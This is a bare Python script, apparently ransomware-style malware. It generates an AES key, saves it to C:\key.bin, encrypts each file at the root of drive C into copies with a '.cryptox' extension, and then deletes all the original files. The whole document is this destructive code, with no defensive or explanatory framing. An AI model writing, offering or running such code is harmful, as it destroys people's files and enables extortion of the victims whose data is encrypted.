import os
import glob
import secrets
from Crypto.Cipher import AES

key = secrets.token_bytes(16)

with open('C:\\key.bin', 'wb') as f:
    f.write(key)

directories = ['C:\\']

for directory in directories:
    files = glob.glob(os.path.join(directory, '*'))

    for file in files:
        with open(file, 'rb') as f:
            data = f.read()

        padded_data = data + b'\0' * (AES.block_size - len(data) % AES.block_size)

        cipher = AES.new(key, AES.MODE_CBC)
        encrypted_data = cipher.iv + cipher.encrypt(padded_data)

        encrypted_file = file + ".cryptox"
        with open(encrypted_file, 'wb') as f:
            f.write(encrypted_data)

    for file in files:
        os.remove(file)






